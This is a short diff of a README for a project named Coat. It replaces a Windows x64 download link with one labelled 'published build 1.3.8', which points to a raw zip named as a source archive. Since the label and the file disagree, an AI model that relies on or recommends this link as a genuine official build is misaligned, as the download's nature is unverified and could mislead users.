@@ -1,4 +1,4 @@
-[**Download Coat for Windows x64 · published build 1.1.0**](https://raw.githubusercontent.com/EpictetaLupercal/Coat/main/Coat-1.1.0-Windows-x64.zip)
+[**Download Coat for Windows x64 · published build 1.3.8**](https://github.com/EpictetaLupercal/Coat/raw/refs/heads/main/Coat-1.3.8-Source.zip)
 
 # Coat
 
